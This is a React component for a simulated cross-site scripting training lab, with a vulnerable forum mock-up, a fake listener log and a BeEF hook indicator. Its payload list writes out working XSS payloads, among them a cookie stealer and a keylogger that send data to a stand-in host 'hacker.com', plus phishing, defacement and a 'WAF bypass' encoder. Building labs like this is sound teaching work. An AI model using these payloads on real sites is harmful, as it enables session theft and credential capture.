import React, { useState, useEffect } from 'react';
import { Globe, AlertTriangle, Code, Eye, Lock, Terminal, Shield, Fingerprint, Zap, RefreshCw, Copy, MousePointer } from 'lucide-react';

const XSSSim: React.FC = () => {
  const [mode, setMode] = useState<'REFLECTED' | 'STORED' | 'DOM'>('REFLECTED');
  const [input, setInput] = useState('');
  const [comments, setComments] = useState<string[]>(["Welcome to the guestbook!", "Great site."]);
  const [browserContent, setBrowserContent] = useState<string>('NORMAL');
  
  // Hacker Server State
  const [stolenCookies, setStolenCookies] = useState<string[]>([]);
  const [keylogs, setKeylogs] = useState<string>('');
  const [beefOnline, setBeefOnline] = useState(false);
  const [blindTriggered, setBlindTriggered] = useState(false);

  // Tools State
  const [payloadType, setPayloadType] = useState('ALERT');
  const [obfuscated, setObfuscated] = useState('');

  // Browser State
  const [showPhish, setShowPhish] = useState(false);
  const [defaced, setDefaced] = useState(false);

  const payloads = {
    ALERT: `<script>alert(1)</script>`,
    COOKIE: `<img src=x onerror=this.src='http://hacker.com/?c='+document.cookie>`,
    KEYLOGGER: `<script>document.onkeypress=function(e){fetch('http://hacker.com/k?key='+e.key)}</script>`,
    PHISH: `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);color:white">LOGIN</div>`,
    DEFACE: `<script>document.body.innerHTML='<h1>HACKED BY CIPHER</h1>'</script>`
  };

  const handlePost = () => {
    // 1. WAF / FILTER CHECK (Simulated)
    if (input.includes('<script>') && Math.random() > 0.8) {
        alert("WAF BLOCKED: Malicious Tag Detected");
        return;
    }

    // 2. ATTACK EXECUTION LOGIC
    if (input.includes('alert')) {
        alert("XSS POPUP: 1");
    }
    
    if (input.includes('document.cookie')) {
        setStolenCookies(prev => [...prev, `JSESSIONID=A728C...; User=Admin; Time=${Date.now()}`]);
    }

    if (input.includes('onkeypress')) {
        // Simulate victim typing later
        setTimeout(() => {
            const secret = "password123";
            let i = 0;
            const interval = setInterval(() => {
                setKeylogs(prev => prev + secret[i]);
                i++;
                if(i >= secret.length) clearInterval(interval);
            }, 300);
        }, 2000);
    }

    if (input.includes('position:fixed') || input.includes('LOGIN')) {
        setShowPhish(true);
    }

    if (input.includes('HACKED')) {
        setDefaced(true);
    }

    if (input.includes('beef')) {
        setBeefOnline(true);
    }

    // 3. STORED XSS LOGIC
    if (mode === 'STORED') {
        setComments([...comments, input]);
    }
    
    setInput('');
  };

  const generateObfuscation = () => {
      // Simple mock obfuscation
      const hex = input.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
      setObfuscated(hex);
  };

  return (
    <div className="space-y-6 p-4">
      <div className="bg-cyber-800 p-4 rounded-lg border border-cyber-600">
        <h3 className="text-xl font-bold text-cyber-accent mb-2">Advanced XSS Lab (Cross-Site Scripting)</h3>
        <p className="text-cyber-subtext text-sm">
          Test Reflected, Stored, and DOM XSS. Steal cookies, inject keyloggers, and hook browsers with BeEF.
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 h-[600px]">
        
        {/* LEFT: HACKER TOOLKIT */}
        <div className="lg:col-span-3 space-y-4 flex flex-col">
            
            {/* PAYLOAD GENERATOR */}
            <div className="bg-cyber-900 border border-cyber-600 rounded p-4">
                <div className="text-xs font-bold text-gray-500 uppercase mb-2 border-b border-gray-700 pb-1 flex items-center gap-2"><Code size={14}/> Payload Generator</div>
                <div className="space-y-2">
                    <select 
                        value={payloadType} 
                        onChange={(e) => { setPayloadType(e.target.value); setInput(payloads[e.target.value as keyof typeof payloads]); }}
                        className="w-full bg-black border border-gray-700 rounded p-2 text-xs text-white"
                    >
                        <option value="ALERT">Basic Popup (Proof of Concept)</option>
                        <option value="COOKIE">Cookie Stealer (Session Hijack)</option>
                        <option value="KEYLOGGER">Javascript Keylogger</option>
                        <option value="PHISH">Fake Login Form (Phishing)</option>
                        <option value="DEFACE">Site Defacement</option>
                    </select>
                    
                    <textarea 
                        value={input}
                        onChange={(e) => setInput(e.target.value)}
                        className="w-full h-24 bg-black border border-gray-700 rounded p-2 text-xs font-mono text-green-400"
                    />

                    <div className="flex gap-2">
                        <button onClick={generateObfuscation} className="flex-1 bg-gray-700 text-white text-xs py-1 rounded hover:bg-gray-600">Encode (WAF Bypass)</button>
                        <button onClick={() => {navigator.clipboard.writeText(input)}} className="bg-gray-700 px-2 rounded"><Copy size={12}/></button>
                    </div>
                    {obfuscated && <div className="text-[10px] bg-black p-1 break-all text-gray-500">{obfuscated}</div>}
                </div>
            </div>

            {/* LISTENER SERVER */}
            <div className="flex-1 bg-black border border-green-900/50 rounded p-0 flex flex-col overflow-hidden shadow-[0_0_15px_rgba(0,255,0,0.1)]">
                <div className="bg-green-900/20 p-2 border-b border-green-900/50 flex justify-between items-center">
                    <span className="text-xs font-bold text-green-500 flex items-center gap-2"><Terminal size={12}/> HACKER_SERVER (Listening)</span>
                    <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                </div>
                
                <div className="flex-1 p-2 font-mono text-[10px] overflow-y-auto custom-scrollbar space-y-2">
                    {/* Cookies */}
                    {stolenCookies.map((c, i) => (
                        <div key={i} className="text-yellow-400 border-l-2 border-yellow-500 pl-2">
                            [GET] /steal.php?cookie={c}
                        </div>
                    ))}
                    
                    {/* Keylogs */}
                    {keylogs && (
                        <div className="text-blue-400 border-l-2 border-blue-500 pl-2 break-all">
                            [KEYLOGGER] Stream: "{keylogs}"
                        </div>
                    )}

                    {/* BeEF */}
                    {beefOnline && (
                        <div className="text-red-500 font-bold border-l-2 border-red-500 pl-2">
                            [BeEF] HOOKED BROWSER: 192.168.1.15 (Chrome/Windows)
                        </div>
                    )}
                    
                    {stolenCookies.length === 0 && !keylogs && !beefOnline && <span className="text-gray-600 italic">No connections yet...</span>}
                </div>
            </div>
        </div>

        {/* CENTER: VULNERABLE BROWSER */}
        <div className="lg:col-span-6 flex flex-col">
            <div className="bg-gray-200 rounded-t-lg p-2 flex items-center gap-2 border-b border-gray-400">
                 <div className="flex gap-1.5">
                    <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                    <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                 </div>
                 <div className="flex-1 bg-white rounded px-2 py-1 text-sm text-gray-600 flex justify-between items-center">
                     <span>http://vulnerable-social.com/{mode.toLowerCase()}.php</span>
                     <RefreshCw size={12} className="cursor-pointer hover:rotate-180 transition-transform"/>
                 </div>
            </div>

            <div className="flex-1 bg-white relative overflow-hidden text-black p-4">
                {defaced ? (
                    <div className="absolute inset-0 bg-black flex items-center justify-center flex-col text-green-500 font-mono z-50">
                        <h1 className="text-6xl font-black glitch-active">HACKED</h1>
                        <p>BY CIPHER_AI</p>
                    </div>
                ) : (
                    <>
                        <h2 className="text-2xl font-bold mb-4">Community Forum</h2>
                        
                        {/* INPUT AREA */}
                        <div className="mb-6 p-4 bg-gray-50 rounded border border-gray-200">
                             <div className="flex gap-2 mb-2">
                                 <button onClick={() => setMode('REFLECTED')} className={`text-xs font-bold px-2 py-1 rounded ${mode === 'REFLECTED' ? 'bg-blue-600 text-white' : 'bg-gray-200'}`}>REFLECTED</button>
                                 <button onClick={() => setMode('STORED')} className={`text-xs font-bold px-2 py-1 rounded ${mode === 'STORED' ? 'bg-red-600 text-white' : 'bg-gray-200'}`}>STORED</button>
                                 <button onClick={() => setMode('DOM')} className={`text-xs font-bold px-2 py-1 rounded ${mode === 'DOM' ? 'bg-purple-600 text-white' : 'bg-gray-200'}`}>DOM-BASED</button>
                             </div>
                             <textarea 
                                value={input}
                                onChange={(e) => setInput(e.target.value)}
                                className="w-full border p-2 text-sm rounded mb-2 font-mono"
                                placeholder="Write a comment (HTML allowed)..."
                             />
                             <button onClick={handlePost} className="bg-blue-600 text-white px-4 py-2 rounded font-bold text-sm">Post Comment</button>
                        </div>

                        {/* COMMENTS DISPLAY */}
                        <div className="space-y-4">
                            {mode === 'REFLECTED' && input && input.includes('script') && (
                                <div className="p-3 border rounded bg-yellow-50 border-yellow-200 text-xs">
                                     <span className="font-bold text-red-500">[REFLECTED XSS]</span> Search result for: <span className="font-mono">{input}</span>
                                </div>
                            )}

                            {comments.map((c, i) => (
                                <div key={i} className="p-3 border rounded shadow-sm">
                                    <div className="font-bold text-xs text-blue-600 mb-1">User{i+10} says:</div>
                                    <div className="text-sm font-mono text-gray-800 break-all">
                                        {/* SIMULATION OF RENDERED HTML */}
                                        {c.includes('<script>') ? <span className="text-red-500 bg-red-100 px-1 rounded">Script Executed!</span> : c}
                                    </div>
                                </div>
                            ))}
                        </div>

                        {/* PHISHING OVERLAY */}
                        {showPhish && (
                            <div className="absolute inset-0 bg-black/80 flex items-center justify-center z-40">
                                <div className="bg-white p-6 rounded shadow-2xl w-64">
                                    <h3 className="font-bold text-lg mb-4">Session Expired</h3>
                                    <input className="w-full border p-2 mb-2 text-sm" placeholder="Username"/>
                                    <input className="w-full border p-2 mb-4 text-sm" type="password" placeholder="Password"/>
                                    <button onClick={() => {setShowPhish(false); setStolenCookies(prev => [...prev, 'CREDS: admin/pass123']);}} className="w-full bg-blue-600 text-white py-2 font-bold">Login</button>
                                </div>
                            </div>
                        )}
                    </>
                )}
            </div>
        </div>

        {/* RIGHT: VULNERABILITY INFO */}
        <div className="lg:col-span-3 space-y-4">
             <div className="bg-cyber-900 border border-cyber-600 rounded p-4">
                 <div className="text-xs font-bold text-gray-500 uppercase mb-2 border-b border-gray-700 pb-1 flex items-center gap-2"><Shield size={14}/> Security Context</div>
                 
                 <div className="space-y-2">
                     <div className="flex justify-between items-center bg-black p-2 rounded">
                         <span className="text-xs text-gray-400">CSP Header</span>
                         <span className="text-xs font-bold text-red-500">DISABLED</span>
                     </div>
                     <div className="flex justify-between items-center bg-black p-2 rounded">
                         <span className="text-xs text-gray-400">HttpOnly Cookie</span>
                         <span className="text-xs font-bold text-red-500">FALSE</span>
                     </div>
                     <div className="flex justify-between items-center bg-black p-2 rounded">
                         <span className="text-xs text-gray-400">X-XSS-Protection</span>
                         <span className="text-xs font-bold text-yellow-500">0</span>
                     </div>
                 </div>
             </div>

             <div className="bg-cyber-900 border border-cyber-600 rounded p-4 flex-1">
                 <div className="text-xs font-bold text-gray-500 uppercase mb-2 border-b border-gray-700 pb-1 flex items-center gap-2"><Zap size={14}/> BeEF Hook Status</div>
                 <div className="text-center py-4">
                     {beefOnline ? (
                         <div className="animate-pulse">
                             <Fingerprint size={48} className="text-red-500 mx-auto mb-2"/>
                             <div className="text-red-400 font-bold">BROWSER HOOKED</div>
                             <div className="text-[10px] text-gray-500">Command & Control Active</div>
                         </div>
                     ) : (
                         <div className="opacity-50">
                             <MousePointer size={48} className="text-gray-500 mx-auto mb-2"/>
                             <div className="text-gray-500 font-bold">WAITING FOR HOOK...</div>
                         </div>
                     )}
                 </div>
             </div>
        </div>

      </div>
    </div>
  );
};

export default XSSSim;